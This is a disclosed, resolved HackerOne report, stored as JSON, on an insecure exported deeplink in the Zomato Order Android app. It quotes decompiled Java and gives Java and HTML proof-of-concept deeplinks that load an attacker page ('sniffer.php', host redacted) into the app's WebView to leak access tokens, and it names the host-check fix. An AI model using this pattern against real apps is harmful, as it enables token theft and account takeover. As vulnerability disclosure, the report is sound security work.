{
  "id": 532225,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MzIyMjU=",
  "url": "https://hackerone.com/reports/532225",
  "title": "[Zomato Order] Insecure deeplink leads to sensitive information disclosure",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2019-04-09T01:46:13.333Z",
  "submitted_at": "2019-04-09T01:46:13.333Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "shell_c0de",
    "url": "/shell_c0de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 2943,
    "url": "https://hackerone.com/eternal",
    "handle": "eternal",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/9525xdsq4bz7ubnoie172ssjv8ul/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/9525xdsq4bz7ubnoie172ssjv8ul/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Eternal",
      "twitter_handle": "Zomato",
      "website": "https://www.eternal.com",
      "about": "Eternal is India’s largest new-age tech company by market cap, comprising of 4 businesses (as of now) – Zomato, Blinkit, District, & Hyperpure."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-09-23T05:54:00.030Z",
  "bug_reporter_agreed_on_going_public_at": "2021-07-05T14:22:57.761Z",
  "team_member_agreed_on_going_public_at": "2021-09-23T05:53:59.907Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello, i want to report the vulnerability found,\nSince the following activity `com.application.zomato.activities.DeepLinkRouter` has `exported=\"true\"` it can be exploited by another application.\n\n###Application Information\n\nApplication: [Zomato Order - Food Delivery App](https://play.google.com/store/apps/details?id=com.application.zomato.ordering)\nPackage Name: `com.application.zomato.ordering`\nVersion: `5.6.4`\nVersion Status: Last\nVulnerable class: `com.application.zomato.activities.DeepLinkRouter`\n\n###Vulnerability\n\nUsing a special intent, you can send the access tokens to a malicious site.\n```java\nFollow the code\npublic class com.application.zomato.activities.DeepLinkRouter extends BaseAppCompactActivity {\npublic void onCreate(Bundle arg4) {\n        super.onCreate(arg4);\n        this.setContentView(0x7F0B04D2);\n if((TextUtils.isEmpty(this.c)) && this.getIntent() != null && this.getIntent().getAction() != null && (\"android.intent.action.VIEW\".equals(this.getIntent().getAction()))) {\n            this.c = this.getIntent().getData().toString();\n        }\n        this.e(this.c);// getting zomatodelivery://etc URL\n//..\nprivate void e(String arg11) {\nv0 = Uri.parse(arg11);\n            if(!\"zomato\".equals(v0.getScheme()) && !\"zomatodelivery\".equals(v0.getScheme())) {\n                return;\n            }\n            v1 = v0.getHost();\n if(\"zloyaltywebview\".equals(v1)) {\n                            if(TextUtils.isEmpty(v0.getQueryParameter(\"url\"))) {\n                                goto label_1496;\n                            }\n                            if(v0.getQueryParameter(\"navigation_bar_type\") != null) {\n                                if(!v0.getQueryParameter(\"navigation_bar_type\").equalsIgnoreCase(\"transparent\")) {\n                                }\n                                else {\n                                    this.a(v0);//without check host\n                                    goto label_1496;\n                                }\n                            }\n\n                            this.g(v0);//with check host\n                            goto label_1496;\n//..\n   private void a(Uri arg4) {\n        String v0 = arg4.getQueryParameter(\"header_title\");\n        String v4 = arg4.getQueryParameter(\"url\") != null ? arg4.getQueryParameter(\"url\") : \"\";\n        this.a(new Intent[]{WebViewActivity.newIntent(((Context)this), v4, v0, false)});//loadUrl\n    }\n```\nHost check missing.\n###PoC:\nJava PoC:\n```java\n  Intent intent = new Intent(\"android.intent.action.VIEW\");\n  intent.setData(Uri.parse(\"zomatodelivery://zloyaltywebview/?url=██████████sniffer.php&navigation_bar_type=transparent\"));\n  startActivity(intent);\n```\nPayload: ████████\n███████\n\nHTML PoC:\n```html\n<a href=\"zomatodelivery://zloyaltywebview/?url=████sniffer.php&navigation_bar_type=transparent\">Send token Zomato</a>\n```\n████\nPayload: █████████zomato.html\n\n###Fix\nCheck the host before load to WebView, your regular check in CommonLib works fine.\n\n## Impact\n\n1) Leakage of access tokens to arbitrary sites\n2) XSS/Ability of open arbitrary sites in your internal WebView",
  "bounty_amount": "750.0",
  "formatted_bounty": "$750",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 112,
  "voters": [
    "lostsoulofawolf",
    "7hun0er3ir0",
    "ahmed0x59",
    "tolga",
    "drsniper",
    "alp",
    "thaivu",
    "k1rox4n",
    "muminkoykiran",
    "shreyaschavhan",
    "and 102 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 387,
    "asset_type": "GOOGLE_PLAY_APP_ID",
    "asset_identifier": "com.application.zomato",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
